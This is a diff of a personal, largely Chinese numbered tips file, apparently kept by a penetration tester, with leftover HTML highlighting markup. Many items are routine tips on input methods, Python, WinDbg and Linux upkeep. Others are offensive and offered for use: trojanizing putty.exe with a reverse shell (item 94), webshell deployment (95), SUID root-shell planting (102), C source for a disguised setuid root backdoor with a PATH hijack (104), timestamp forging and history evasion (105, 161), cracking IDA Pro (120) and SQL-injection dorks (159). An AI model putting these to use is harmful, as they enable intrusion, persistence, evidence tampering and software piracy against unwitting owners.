-                       https://wu.nerd.moe/?p=1752
-                       /usr/bin/rime_dict_manager自带词库管理工具
-                            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
-                            windows:%appdata%&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ime&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ubi86.userdb.kct
-                       http://www.jianshu.com/p/cffc0ea094a7
-                       https://github.com/rime/home/wiki/CustomizationGuide
-                       重新部署使配置生效:---&amp;gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx&lt;span class=&quot;sb&quot;&gt;
-
-                       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
-                       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
-                       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
-                       eg.my default.custom.yaml file:
-                       ---------------------start------------------------
-                            patch:
-                                menu/page_size: 9
-                                schema_list:
-                                  - schema: luna_pinyin
-                                  - schema: luna_pinyin_fluency
-                                  - schema: luna_pinyin_simp
-                                  - schema: wubi_pinyin
-                                  - schema: wubi86
-                                  - schema: emoji
-                                ascii_composer:
-                                  good_old_caps_lock: true
-                                  switch_key:
-                                    Caps_Lock: clear
-                                    Control_L: noop
-                                    Control_R: commit_text
-                                    Eisu_toggle: clear
-                                    Shift_L: commit_code
-                                    Shift_R: inline_ascii
-                      --------------------end----------------------------
-    windows中rime词库文件位置:%APPDATA%\rime
-    深蓝词库转换工具:
-                    https://github.com/studyzy/imewlconverter
-                    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;93.&lt;/span&gt;windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;amp;form=MSHOME
-&lt;span class=&quot;p&quot;&gt;94.&lt;/span&gt;backdoor-factory用法:
-&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
-                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
-                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former &#39;show&#39; command) -H vps&#39;s ip -P 200
-&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;backdoor-factory in veil:--&amp;gt;veil--&amp;gt;list--&amp;gt;number of native/backdoor-factory--&amp;gt;options--&amp;gt;set the options
-&lt;span class=&quot;p&quot;&gt;95.&lt;/span&gt;aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
-   my way defferent from uppon one:
-   create a new folder,create a web.config file with below content:
-   --------------------------content------------------------
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;nt&quot;&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;/system.web&amp;gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
-   --------------------------end of content----------------
-   then upon a strong webshell to my new created folder,found no more error.
-&lt;span class=&quot;p&quot;&gt;96.&lt;/span&gt;百度云上传限制绕过:copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
-&lt;span class=&quot;p&quot;&gt;97.&lt;/span&gt;windows中ping google &amp;amp;&amp;amp; ping baidu ==&amp;gt;ping.bat:
-                                         cmd /k &quot;ping www.google.com.hk &amp;amp;&amp;amp; ping www.baidu.com&quot;
-   创建ping.bat文件的快捷方式,在快捷方式中添加快捷键.eg.ctrl+alt+p
-&lt;span class=&quot;p&quot;&gt;98.&lt;/span&gt;linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128
-&lt;span class=&quot;p&quot;&gt;99.&lt;/span&gt;booklist:http://www.jianshu.com/p/67e294106919
-&lt;span class=&quot;p&quot;&gt;100.&lt;/span&gt;gdb:http://www.jianshu.com/p/f20b10ea9a61
-&lt;span class=&quot;p&quot;&gt;101.&lt;/span&gt;study links:
-    http://www.shiyanbar.com/questions/733
-    http://ch3rish.lofter.com/post/1d503b96_791362d
-&lt;span class=&quot;p&quot;&gt;102.&lt;/span&gt;linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
-    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
-        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
-    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
-    find / -perm -2 -type f -print             function:find files can be writeable by everyone
-        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
-        /tmp/.sh -p(this command to get a euid=root shell)
-&lt;span class=&quot;p&quot;&gt;103.&lt;/span&gt;linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
-&lt;span class=&quot;p&quot;&gt;104.&lt;/span&gt;one linux backdoor shell can be like this:(file.c)
-    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;unistd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    
-    int main(int argc, char &lt;span class=&quot;gs&quot;&gt;**argv, char **&lt;/span&gt;envp)
-    {
-    	gid_t gid;
-    	uid_t uid;
-    	gid = getegid();
-    	uid = geteuid();
-    
-    	setresgid(gid, gid, gid);
-    	setresuid(uid, uid, uid);
-    
-    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
-    }&lt;span class=&quot;sb&quot;&gt;
-
-    to use this file as a root shell backdoor after got a root shell,
-    use root role execute:
-        gcc -o 1 file.c
-        mv 1 /bin/l2ping
-        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
-    use webshell role execute:
-        PATH=/tmp:$PATH
-        export PATH
-        echo $PATH(to check if /tmp is in $PATH)
-        ln -s /bin/sh /tmp/echo
-    then use webshell role to get a root privilege shell:
-        /bin/l2ping
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;105.&lt;/span&gt;linux中修改文件时间
-    同时修改文件的修改时间和访问时间
-    touch -d &quot;2010-05-31 08:10:30&quot; test.doc
-&lt;span class=&quot;p&quot;&gt;106.&lt;/span&gt;rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启
-&lt;span class=&quot;p&quot;&gt;107.&lt;/span&gt;ssh文件复制:eg.本机未登录前执行
-        scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote-&amp;gt;local)
-        scp /tmp.txt level08@192.168.2.140:/home/level08/                (local-&amp;gt;remote)
-&lt;span class=&quot;p&quot;&gt;108.&lt;/span&gt;echo &#39;ibase=16;410&#39; | bc 
-        16进制的410转换成默认10进制:out-&amp;gt;1040
-    echo &#39;ibase=16;obase=2;410&#39; | bc
-        16进制的410转换成2进制:out-&amp;gt;10000010000
-&lt;span class=&quot;p&quot;&gt;109.&lt;/span&gt;python中ord和int:
-    int(&#39;12&#39;)=12
-    int(&#39;b&#39;)=error(int的参数只能是&#39;num&#39;类型)
-    ord(&#39;b&#39;)=98
-    ord(&#39;a&#39;)=97
-    ord(&#39;0&#39;)=48
-    ord(&#39;ascii&#39;)=ascii这一个字符对应的十进制整数(ascii只能是a character,not string)
-&lt;span class=&quot;p&quot;&gt;110.&lt;/span&gt;书单
-        http://www.heysec.org/archives/257
-        https://www.zhihu.com/question/24152689
-        http://m.blog.csdn.net/article/details?id=45482849
-&lt;span class=&quot;p&quot;&gt;111.&lt;/span&gt;linux上ssh无法以root用户登录解决方法:
-    vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
-    /PermitRootLogin&lt;span class=&quot;nt&quot;&gt;&amp;lt;Enter&amp;gt;&lt;/span&gt;
-    change to:
-        PermitRootLogin yes
-&lt;span class=&quot;p&quot;&gt;112.&lt;/span&gt;gcc编译so文件:
-        gcc -shared -fPIC myfile.c -o myfile.socc
-&lt;span class=&quot;p&quot;&gt;113.&lt;/span&gt;wordpress 渗透工具
-&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;wpscan
-&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;http://www.getwpxf.com/  seems better
-&lt;span class=&quot;p&quot;&gt;114.&lt;/span&gt;linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/
-&lt;span class=&quot;p&quot;&gt;115.&lt;/span&gt;一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
-    一个汉字是2个字符4个字节32位,4 bytes,32 bits
-    一个DWORD则是4个字符8个字节64位,8 bytes,64 bits
-&lt;span class=&quot;p&quot;&gt;116.&lt;/span&gt;linux安装程序
-    cd program
-    ./configure
-    make
-    sudo make install
-&lt;span class=&quot;p&quot;&gt;117.&lt;/span&gt;linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,否则本地编译出exploit文件后上传到对方机器运行时会出现can not execute binary file的错误
-&lt;span class=&quot;p&quot;&gt;118.&lt;/span&gt;访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,但是404显示目录下的文件还是可以正常访问的
-&lt;span class=&quot;p&quot;&gt;119.&lt;/span&gt;c_++头:
-        using namespace std;
-        #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;120.&lt;/span&gt;ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
-&lt;span class=&quot;p&quot;&gt;121.&lt;/span&gt;ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
-&lt;span class=&quot;p&quot;&gt;122.&lt;/span&gt;html中的图标    http://fontawesome.io/icons/
-&lt;span class=&quot;p&quot;&gt;123.&lt;/span&gt;fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
-&lt;span class=&quot;p&quot;&gt;124.&lt;/span&gt;html转pdf:
-    wkhtmltopdf www.myhomepage.com myhomepage.pdf
-    在线pdf编辑 http://www.pdfescape.com/
-    本地pdf快速转换:chrome浏览器(全选或部分选择后)右键可打印成pdf
-&lt;span class=&quot;p&quot;&gt;125.&lt;/span&gt;printf(&quot;%x&quot;):第一个栈里的值
-    printf(&quot;%3x&quot;):第一个栈里的值,用3个字节长度表示
-    printf(&quot;%3&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;x&quot;):第三个栈里的值(这一条适用于绝大多数的&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)来达到同样的目的)
-    宽度格式符(%3)中的%和3是不分开的,如果%3后面加了&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;(直接参数访问)则表示为打印第3个栈里的值
-&lt;span class=&quot;p&quot;&gt;126.&lt;/span&gt;visual studio快速编译一个c文件
-    运行C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files (x86)&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft Visual Studio 14.0&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;ommon7&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;ools&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;sDevCmd.bat
-    然后运行cl md.c
-    或者打开tools里面的开发人员提示符,然后再cl md.c
-&lt;span class=&quot;p&quot;&gt;127.&lt;/span&gt;安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和pcapy用管理员身份安装
-&lt;span class=&quot;p&quot;&gt;128.&lt;/span&gt;sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成os.startfile或subprocess中的popen
-    os.startfile(相当于双击操作,eg. os.startfile(&quot;1.txt&quot;)):   http://blog.sina.com.cn/s/blog_4b5039210100froh.html
-&lt;span class=&quot;p&quot;&gt;129.&lt;/span&gt;my_sulley学习资料
-    http://pan.baidu.com/s/1c1Y6kVY
-&lt;span class=&quot;p&quot;&gt;130.&lt;/span&gt;linux中批量替换目录文件中的字符串:
-    sed -i &quot;s/xinghuacai/3xp10it/g&quot; &lt;span class=&quot;sb&quot;&gt;`grep xinghuacai -rl .`&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;131.&lt;/span&gt;github在push时免输入用户名密码:
-    http://www.cnblogs.com/ballwql/p/3462104.html
-&lt;span class=&quot;p&quot;&gt;132.&lt;/span&gt;mysql中表名为关键字的处理方法,&lt;span class=&quot;sb&quot;&gt;`table_name`&lt;/span&gt;
-    http://www.cnblogs.com/puzi0315/archive/2012/08/27/2658169.html
-&lt;span class=&quot;p&quot;&gt;133.&lt;/span&gt;windows截图神器Snipaste
-    http://zh.snipaste.com/
-&lt;span class=&quot;p&quot;&gt;134.&lt;/span&gt;windows下rime修改备选词个数:打开default.yaml,修改对应数字
-&lt;span class=&quot;p&quot;&gt;135.&lt;/span&gt;ranger:linux terminal file manage god software
-&lt;span class=&quot;p&quot;&gt;136.&lt;/span&gt;github pages生成的博客本地有语法高亮而正常http://3xp10it.github.io没有语法高亮的原因:
-    由于github将博客升级成https://3xp10it.github.io,而本地浏览器访问https://3xp10it.github.io时,出于安全性考虑,禁用了js
-    本地生成的博客为http://127.0.0.1:4000,没有https
-    解决办法:https://help.github.com/articles/securing-your-github-pages-site-with-https/
-        将博客文件夹中的https变成http
-&lt;span class=&quot;p&quot;&gt;137.&lt;/span&gt;终端字符串生成图像工具
-    banner
-    figlet
-    toilet
-    http://blog.chinaunix.net/uid-10540984-id-2881092.html
-    https://xin053.github.io/2016/07/06/pyfiglet%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/
-&lt;span class=&quot;p&quot;&gt;138.&lt;/span&gt;bind shift+e to firefox&#39;s perference shortcut key bind
-&lt;span class=&quot;p&quot;&gt;139.&lt;/span&gt;制作pypi的python模块(eg.exp10it.py)时,在本地如果exp10it.py中有中文,在一个正常的py文件中如果有一句from exp10it import &lt;span class=&quot;ge&quot;&gt;*,如果这个正常的py文件中由于这句导入了相同文件夹目录下的exp10it.py模块,会由于其中的中文而产生错误,可以上传到pypi后由pip install安装exp10it模块后使用from exp10it import *&lt;/span&gt;,同时需要删除同目录下的exp10it.py文件,否则from exp10it import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;依然会优先从同目录下找exp10it.py模块
-&lt;span class=&quot;p&quot;&gt;140.&lt;/span&gt;sqlmap得出经验,一般跑出只有盲注的uri注入点,一般都是由于waf拦截了普通的union注入语句,只要想办法绕过waf就可以用union来快速注入了,否则只能用sqlmap跑出来的盲注payload进行慢慢的注入,且有可能不能注入出所有数据,依然被waf拦截
-&lt;span class=&quot;p&quot;&gt;151.&lt;/span&gt;python模块中声明编码为utf-8的注释代码不用放在前两行,如果出错,说明代码其他地方有误
-&lt;span class=&quot;p&quot;&gt;152.&lt;/span&gt;compiz和unity的问题:
-    dconf reset -f /org/compiz
-    setsid unity
-    unity --reset-icons&lt;span class=&quot;sb&quot;&gt;
-
-    another:
-    cd 
-    rm -rf .config/apps/compiz*
-    rm -rf .cache/compizconfig-1
-    rm -rf .config/compiz-1
-    rm -rf .compiz
-    
-    本机出现窗口没有&quot;关闭,最小化&quot;等解决方法:
-        打开compiz设置在窗口管理处勾选&quot;放置窗口&quot;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;153.&lt;/span&gt;linux清理:
-    1&amp;gt;apt-get autoremove
-    2&amp;gt;apt-get autoclean
-    3&amp;gt;apt-get clean
-    4&amp;gt;dpkg -l |grep ^rc|awk &#39;{print $2}&#39; |sudo xargs dpkg -P(一键删除残余配置文件)
-&lt;span class=&quot;p&quot;&gt;154.&lt;/span&gt;ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619
-&lt;span class=&quot;p&quot;&gt;155.&lt;/span&gt;ubuntu 16.04 super+d切换到桌面的方法,在系统的键盘设置中取消导航中的隐藏所有窗口的super+d的快捷键,打开compizconfig settins manager,搜索unity,找到显示桌面的快捷键设置处,设置为super+d
-&lt;span class=&quot;p&quot;&gt;156.&lt;/span&gt;pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
-&lt;span class=&quot;p&quot;&gt;157.&lt;/span&gt;grep多行匹配:(eg.匹配exp10it.py中的api)
-    pcregrep -M &#39;def .&lt;span class=&quot;ge&quot;&gt;*(.*&lt;/span&gt;):&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;(.&lt;span class=&quot;ge&quot;&gt;*#.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;){1,10}&#39;
-&lt;span class=&quot;p&quot;&gt;158.&lt;/span&gt;linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
-    ps -aux | grep &quot;vmware&quot;
-    kill pid_of_error_machine
-&lt;span class=&quot;p&quot;&gt;159.&lt;/span&gt;google dock:
-    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
-    inurl:&quot;php&quot;|&quot;php page=&quot;|&quot;php id=&quot;|&quot;php tid=&quot;|&quot;php pid=&quot;|&quot;php cid=&quot;|&quot;php path=&quot;|&quot;php cmd=&quot;|&quot;php file=&quot;|&quot;php cartId=&quot;|&quot;php bookid=&quot;|&quot;php num=&quot;|&quot;php idProduct=&quot;|&quot;php ProdId=&quot;|&quot;php idCategory=&quot;|&quot;php intProdID=&quot;|&quot;cfm storeid=&quot;|&quot;php catid=&quot;|&quot;php cart_id=&quot;|&quot;php order_id=&quot;|&quot;php catalogid=&quot;|&quot;php item=&quot;|&quot;php title=&quot;|&quot;php CategoryID=&quot;|&quot;php action=&quot;|&quot;php newsID=&quot;|&quot;php newsid=&quot;|&quot;php product_id=&quot;|&quot;php cat=&quot;|&quot;php parent_id=&quot;|&quot;php view=&quot;|&quot;php itemid=&quot; site:www.facebook.com
-    site:xxx.xxx.xxx inurl:union select
-    site:xxx.xxx.xxx intext:warning|error|syntax|incorrect|unexpected|occurred|command|execute
-&lt;span class=&quot;p&quot;&gt;160.&lt;/span&gt;my own github&#39;s md file:
-    每行111个字节长度,但是写md时并不用在vim中设置111个字节长度后自动换行,因为md文件会在应该换行的时候自动换行,只要将一段的内容写到md文件中的一行中即可
-&lt;span class=&quot;p&quot;&gt;161.&lt;/span&gt;echo $HISTCONTROL,如果结果为ignoreboth,执行命令时先加空格再输入命令则history不会记录
-&lt;span class=&quot;p&quot;&gt;162.&lt;/span&gt;github-pages 使用多说
-    http://www.ituring.com.cn/article/114888
-&lt;span class=&quot;p&quot;&gt;163.&lt;/span&gt;windbg调试命令详解:
-    http://www.yiiyee.cn/Blog/windbg/
-    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
-    db esi:查看esi地址中的内容
-        db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
-    !address edi:显示edi地址处的内存状态,信息
-    lmm mso v:匹配mso模块,并显示详细信息
-    bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
-    g:让被调试的程序继续运行(f5)
-        gh:把异常标识为已处理并断续执行程序
-        go:对异常不进行任何处理并继续执行程序
-    kb:显示传递给堆栈回溯中的每个函数的前三个参数
-        kp:显示传递给堆栈回溯中的每个函数的所有参数
-    ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
-        uf test!main:反汇编test!main函数
-    p:单步步入step into(f11)
-    t:单步步过step over(f10)
-    ? ebp-edi:显示表达式ebp-edi的值
-        ?? expression:显示c++表达式的值
-    .cls:清屏
-&lt;span class=&quot;p&quot;&gt;164.&lt;/span&gt;firefox好用的一个翻译附加组件:
-    S3.Google Translator
-&lt;span class=&quot;p&quot;&gt;165.&lt;/span&gt;firefox的vimperator插件使用:
-    http://wangbixi.com/x2923/comment-page-1/
-    http://pchu.blogbus.com/
-    http://luoxiqofy.blogbus.com
-    http://www.cnblogs.com/flywuya/archive/2010/12/29/1920485.html
-&lt;span class=&quot;p&quot;&gt;166.&lt;/span&gt;恶意文档分析技巧及工具快速参考
-    http://wenku.baidu.com/link?url=m7GL0Q9W8Pei47frvTquIe9pAgKejBtPesAwZFiClOAEHK23ZF5xRxqA8eowV6e1HiKscwjxIWNOFRC3ep78yFurtSN5L0ZjQ0gV4uu72Lq
-&lt;span class=&quot;p&quot;&gt;167.&lt;/span&gt;ubuntu安装java
-    http://www.linuxdiyf.com/linux/21071.html
-&lt;span class=&quot;p&quot;&gt;168.&lt;/span&gt;文件下载或文件读取漏洞思路:
-    1&amp;gt;读数据库连接文件
-    2&amp;gt;尝试连接数据库
-        a&amp;gt;是否支持数据库外连
-        b&amp;gt;是否有phpmyadmin(扫目录)
-            select ... into dumpfile ...
-                如果不知道写shell路径,可从phpmyadmin中找找数据库中存在的路径,实战中找到过phpmyadmin的web页面的路径
-            如果不能写文件则通过查看数据库中的管理员用户名密码进后台上传shell
-            或者用数据库中的其他密码尝试连接ftp
-            或者如果数据库中有editor的setting,修改为可以上传php
-    3&amp;gt;尝试读取到ftp配置文件,尝试用数据库用户名密码连接ftp
-    4&amp;gt;代码审计
-&lt;span class=&quot;p&quot;&gt;169.&lt;/span&gt;www.gnu.org上可以下载linux系统自带的工具,eg.find工具
-&lt;span class=&quot;p&quot;&gt;170.&lt;/span&gt;discuz漏洞扫描工具
-    dzscan
-    https://github.com/code-scan/dzscan
-&lt;span class=&quot;p&quot;&gt;171.&lt;/span&gt;windbg中找不到symbol路径解决方法:
-    .sympath srv&lt;span class=&quot;ge&quot;&gt;*c:symbols*&lt;/span&gt;http://msdl.microsoft.com/download/symbols
-    .reload /f
-&lt;span class=&quot;p&quot;&gt;172.&lt;/span&gt;《深入理解计算机系统》读书参照
-    http://wdxtub.com/2016/04/16/thin-csapp-0/
-    http://www.voidcn.com/blog/zym0017d/article/p-540879.html
-&lt;span class=&quot;p&quot;&gt;173.&lt;/span&gt;实用的搜索引擎
-    http://kaopu.so/
-&lt;span class=&quot;p&quot;&gt;174.&lt;/span&gt;awk实用指南
-    http://awk.readthedocs.io/en/latest/chapter-one.html
-&lt;span class=&quot;p&quot;&gt;175.&lt;/span&gt;ssrf相关
-    http://evilcos.me/?p=221
-&lt;span class=&quot;p&quot;&gt;176.&lt;/span&gt;find查找最近的文件:
-    find / -amin -10 # 查找在系统中最后10分钟访问的文件
-    find / -atime -2 # 查找在系统中最后48小时访问的文件
-    
-    find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件
-    find / -mtime -1 #查找在系统中最后24小时里修改过的文件76
-&lt;span class=&quot;p&quot;&gt;177.&lt;/span&gt;php数组键值对
-    http://www.cnblogs.com/coderchuanyu/p/3904711.html
-&lt;span class=&quot;p&quot;&gt;178.&lt;/span&gt;快速查看webshell大马是否含有后门:
-    firebug|网络,如果看到访问大马时还有其他可疑访问uri,说明有后门
-&lt;span class=&quot;p&quot;&gt;179.&lt;/span&gt;pyc文件相当于pyhton文件的缓存,如果import了某个模块后在目录下生成了pyc文件,就算这个刚才被import的py模块被删除了,但是由于pyc文件还存在,仍然可以import 该模块
-&lt;span class=&quot;p&quot;&gt;180.&lt;/span&gt;python查看模块中有哪些函数(dir()用法)
-    http://www.iplaypython.com/jichu/dir.html
-&lt;span class=&quot;p&quot;&gt;181.&lt;/span&gt;python多线程中使用multiprocessing.pool参数为多个的使用方法
-    http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map&lt;span class=&quot;sb&quot;&gt;
-
-    from multiprocessing.dummy import Pool as ThreadPool
-    pool=ThreadPool(20)
-    使用map和map_async:
-        pool.map() vs pool.map_async
-        map是阻塞的,要等到map里面的列表中的所有
-        相应文档:
-            https://docs.python.org/2/library/multiprocessing.html(英文)
-            http://python.usyiyi.cn/translate/python_278/library/index.html(中文)
-            中文不详尽,英文中说到multiprocessing.dummy就是multiprocessing的复制版本,只不过multiprocessing.dummy作用于线程
-            &quot;multiprocessing.dummy replicates the API of multiprocessing but is no more than a wrapper around the threading module.&quot;
-            所以参考multiprocessing的api来使用操作线程池即可
-
-            https://mugglecoding.gitbooks.io/qa/content/poolzen_yao_shi_yong.html
-
-            pool.close()
-                防止任何更多的任务(其他没有安排过的任务,map过的任务不属于这个范围)被提交到线程池中.一旦所有的任务已经完成了工作线程将退出.
-            pool.terminate()
-                立即停止线程池中的工作线程(无论任务有没有完成),经测试并不能停止所有的线程池中要进行的任务,应该
-                是只能停止当前正在执行的一个函数过程(子线程)
-
-                为了停止线程池中的所有线程,尤其是在爆破密码时,某一个线程已经爆破成功,为了达到&quot;停止其他的将要执
-                行的通过map加入到pool线程池中的任务&quot;相同的效果,在每个线程中的开头判断是否已经爆破成功,成功则直
-                接return,不成功则继续本线程应该完成的工作
-            pool.join()
-                等待线程池中的工作线程退出,必须先使用pool.close()或者pool.terminate()才能调用join()
-
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;182.&lt;/span&gt;cms在线识别
-    http://whatweb.bugscaner.com/
-&lt;span class=&quot;p&quot;&gt;183.&lt;/span&gt;Netifera(域分析神器)
-&lt;span class=&quot;p&quot;&gt;184.&lt;/span&gt;渗透图
-    http://images0.cnblogs.com/blog2015/640760/201506/121255389739630.png
-    http://www.e-wolf.top/content/uploadfile/201608/0f9f1471011328.jpg
-&lt;span class=&quot;p&quot;&gt;185.&lt;/span&gt;python函数嵌套时在内层函数中操作外层函数的变量,不使用全局变量的方法
-    http://www.crifan.com/python_access_parent_nesting_function_local_variable_from_nested_function/
-&lt;span class=&quot;p&quot;&gt;186.&lt;/span&gt;python使用mechanize进行web交互(可列表单,填表单,提交表单,使用代理等很方便)
-    http://blog.csdn.net/jeanphorn/article/details/46917159
-    http://blog.chinaunix.net/uid-26722078-id-3507409.html
-&lt;span class=&quot;p&quot;&gt;187.&lt;/span&gt;python显示进度条方法
-    http://www.111cn.net/phper/python/66812.htm
-&lt;span class=&quot;p&quot;&gt;188.&lt;/span&gt;python中https访问认证失败解决方法:
-    http://bookshadow.com/weblog/2015/04/22/sae-python-weibo-sdk-certificate-verify-failed/
-&lt;span class=&quot;p&quot;&gt;189.&lt;/span&gt;python中sys.stdout模块
-    http://www.cnblogs.com/turtle-fly/p/3280519.html
-    a. print &quot;something&quot;   相当于sys.stdout.write(&quot;something&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&quot;)
-    b. print &quot;something&quot;,  相当于sys.stdout.write(&quot;something&quot;)&lt;span class=&quot;sb&quot;&gt;
-
-    没有换行的print或sys.stdout.write()都不会立即打印出来,需要遇到有换行的地方才会显示,或者没有遇到换行只能在
-    程序运行结束后强制显示,也即b中的方法不会打印出内容到终端,加sys.stdout.flush()才可以马上显示,或者遇到下面的
-    print有换行功能,或者程序结束才会打印出来
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;190.&lt;/span&gt;查看python模块文档
-        python -m pydoc -p 500
-    python官方文档中文站
-        http://python.usyiyi.cn/translate/python_278/library/index.html
